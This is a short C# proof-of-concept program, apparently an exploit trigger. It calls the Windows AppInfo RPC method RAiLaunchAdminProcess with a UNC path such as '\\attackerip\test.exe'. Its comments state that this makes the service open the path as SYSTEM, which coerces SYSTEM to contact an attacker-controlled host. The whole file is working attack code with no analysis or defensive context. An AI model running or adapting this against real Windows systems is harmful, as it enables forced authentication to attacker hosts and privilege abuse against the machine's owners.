using System;
using NtApiDotNet.Ndr.Marshal;

namespace Trigger
{ 
    class Program
    {
            static void Main(String[] args)
            {

                if (args.Length == 0)
                { 
                    Console.WriteLine(@"[*] Specify the target path e.G. \\attackerip\test.exe");
                    return;
                }
                try
                {
                    using (var client = new Client())
                    {
                        client.Connect();
                        Struct_0 s = new Struct_0();
                        NdrUInt3264 o = new NdrUInt3264();
                        Struct_2 p = new Struct_2();
                        int p10 = 0;

                        // The input parameters dont really matter besides from the first one
                        // the process is never created as its prevented for low priv users but CreateFileW is called on args[0] as SYSTEM
                        client.RAiLaunchAdminProcess(args[0], "", 0x01, 0x00000400, @"C:\", @"WinSta0\Default", s, o, 0, out p, out p10);

                        Console.WriteLine("[*] Done.");


                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}");
                    Console.WriteLine($"Stack trace: {ex.StackTrace}");
                }
            }
    }


}